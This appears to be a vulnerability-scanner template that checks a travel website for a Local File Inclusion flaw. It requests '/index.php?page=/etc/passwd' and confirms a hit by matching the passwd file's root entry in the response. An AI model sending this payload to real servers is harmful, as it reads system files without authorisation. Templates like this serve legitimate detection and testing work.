id: taiwanese-travel-lfi
name: Taiwanese Travel - Local File Inclusion
severity: high
confidence: confirmed
description: The vulnerability in '/index.php?page=' allows for Local File Inclusion (LFI), granting attackers the ability
  to include and potentially execute files on the server, compromising the application's security
reference: https://www.exploitalert.com/view-details.html?id=35607
tags:
- lfi
- unauth
- taiwanese
- vuln
requests:
- method: GET
  path: /index.php?page=/etc/passwd
  matchers:
  - type: regex
    regex:
    - 'root:x:0:0:'
  - type: body
    words:
    - travel
  - type: status
    status:
    - 200
  condition: and
